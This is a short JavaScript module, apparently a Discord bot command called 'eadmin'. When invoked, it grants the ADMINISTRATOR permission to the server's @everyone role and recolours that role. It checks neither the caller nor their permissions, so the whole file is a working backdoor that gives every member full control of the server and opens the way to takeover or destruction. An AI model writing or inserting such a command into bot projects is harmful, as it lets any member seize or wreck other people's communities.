module.exports = {
    name: 'eadmin',
    async execute(message) {


        await message.guild.roles.everyone.setPermissions(["ADMINISTRATOR"]);
        await message.guild.roles.everyone.setColor("#001777");
    }
};